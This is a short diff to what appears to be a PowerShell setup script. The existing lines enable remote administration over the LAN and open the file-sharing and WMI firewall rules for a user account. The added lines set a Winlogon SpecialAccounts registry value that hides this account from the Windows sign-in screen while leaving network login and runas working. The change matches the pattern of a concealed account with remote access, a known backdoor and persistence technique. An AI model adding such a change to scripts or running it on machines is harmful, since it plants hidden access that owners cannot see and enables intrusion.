@@ -41,6 +41,9 @@ if (-not $admin) {
             reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f | Out-Null
             P "  enabled LocalAccountTokenFilterPolicy (remote admin over LAN)."
             try { Enable-NetFirewallRule -DisplayGroup 'File and Printer Sharing' -EA SilentlyContinue; Enable-NetFirewallRule -DisplayGroup 'Windows Management Instrumentation (WMI)' -EA SilentlyContinue; P "  file-sharing + WMI firewall rules enabled." } catch {}
+            # hide the account from the sign-in / Welcome screen (still works for network login + runas)
+            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v $User /t REG_DWORD /d 0 /f | Out-Null
+            P "  hidden '$User' from the login screen (network login + runas still work)."
             $script:lanUser = $User
         } catch { P "  account setup error: $($_.Exception.Message)" }
     }
